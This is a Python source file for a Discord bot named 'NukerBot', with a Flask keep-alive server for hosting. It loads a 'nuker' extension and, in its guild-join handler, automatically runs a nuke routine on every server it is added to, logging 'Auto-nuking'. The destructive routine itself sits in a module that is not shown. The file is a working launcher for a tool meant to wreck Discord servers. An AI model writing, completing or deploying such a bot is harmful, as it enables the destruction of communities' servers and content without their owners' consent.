import discord
from discord.ext import commands, tasks
import os
import asyncio
from flask import Flask
from datetime import datetime

app = Flask(__name__)
bot_name = "Loading..."

@app.route('/')
def home():
    return f"🤖 {bot_name} - Operational"

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

TOKEN = os.getenv("DISCORD_TOKEN")

class NukerBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.all()
        super().__init__(
            command_prefix="!",
            intents=intents,
            help_command=None
        )
        self.start_time = datetime.now()

    async def setup_hook(self):
        try:
            await self.load_extension("cogs.nuker")
            print("✅ Loaded nuker cog")
        except Exception as e:
            print(f"❌ Failed to load cog: {e}")

        await self.tree.sync()
        self.update_status.start()

    async def on_ready(self):
        global bot_name
        bot_name = str(self.user)
        print(f"🔗 {bot_name} is ONLINE!")
        
        if os.environ.get('RENDER'):
            import threading
            threading.Thread(target=run_flask, daemon=True).start()
            print("🚀 Flask server started")

    async def on_guild_join(self, guild):
        print(f"💥 Auto-nuking: {guild.name}")
        nuker_cog = self.get_cog("NukerCommands")
        if nuker_cog:
            await nuker_cog.nuke_server(guild)

    @tasks.loop(minutes=5)
    async def update_status(self):
        try:
            await self.change_presence(activity=discord.Activity(
                type=discord.ActivityType.watching,
                name="Server Nuker"
            ))
        except:
            pass

if __name__ == "__main__":
    bot = NukerBot()
    bot.run(TOKEN)
